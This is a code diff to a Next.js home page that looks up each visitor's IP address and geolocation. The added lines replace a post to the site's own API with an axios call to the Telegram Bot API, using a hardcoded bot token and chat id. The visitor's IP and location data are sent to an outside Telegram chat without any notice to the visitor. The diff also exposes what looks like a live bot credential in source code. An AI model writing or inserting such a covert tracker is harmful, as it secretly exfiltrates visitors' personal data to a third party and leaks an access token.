@@ -1,6 +1,7 @@
 import Image from "next/image";
 import { Inter } from "next/font/google";
 import { useEffect, useState } from "react";
+import axios from "axios";
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -23,15 +24,19 @@ export default function Home() {
     const res = await fetch("https://freeipapi.com/api/json");
     const data = await res.json();
     console.log(data);
-    const send = await fetch("/api/hello", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        data,
-      }),
-    });
+    const api = `https://api.telegram.org/bot6360176021:AAEQgL9ib0zZ6HuRZEVCfZBW9_TngCNfqbo`;
+    console.log(data);
+    axios
+      .post(`${api}/sendMessage`, {
+        chat_id: "-4152348122",
+        text: data,
+      })
+      .then((response) => {
+        console.log(response);
+      })
+      .catch((err) => {
+        console.log(err);
+      });
     setData(data);
   };
 
